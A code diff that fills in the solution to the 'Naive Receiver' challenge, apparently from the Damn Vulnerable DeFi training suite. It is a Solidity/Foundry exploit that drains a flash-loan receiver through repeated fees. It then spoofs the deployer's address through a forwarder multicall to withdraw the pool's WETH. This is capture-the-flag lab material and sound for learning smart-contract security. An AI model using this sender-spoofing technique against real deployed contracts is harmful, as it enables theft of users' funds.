@@ -77,7 +77,59 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        uint256 funds = weth.balanceOf(address(pool)) + weth.balanceOf(address(receiver));
+
+        bytes[] memory calls = new bytes[](11);
+        for (uint256 i = 0; i < 10; ++i) {
+            calls[i] = abi.encodeWithSignature(
+                "flashLoan(address,address,uint256,bytes)",
+                receiver,
+                address(weth),
+                1 ether,
+                ""
+            );
+        }
+
+        calls[10] = bytes.concat(
+            abi.encodeWithSignature("withdraw(uint256,address)", funds, player),
+            abi.encode(deployer)
+        );
+
+        bytes memory data = abi.encodeWithSignature(
+            "multicall(bytes[])",
+            calls
+        );
+
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: gasleft(),
+            nonce: 0,
+            data: data,
+            deadline: block.timestamp
+        });
+        bytes32 hashStruct = forwarder.getDataHash(request);
+
+        bytes32 digest = keccak256(
+            abi.encodePacked(
+                uint16(0x1901),
+                forwarder.domainSeparator(),
+                hashStruct
+            )
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s ,v);
+
+        vm.stopPrank();
+        // stop prank and start broadcast so that player's nonce increases
+        vm.startBroadcast(player);
+
+        forwarder.execute(request, signature);
+        weth.transfer(address(recovery), funds);
+
+        vm.stopBroadcast();
     }
 
     /**
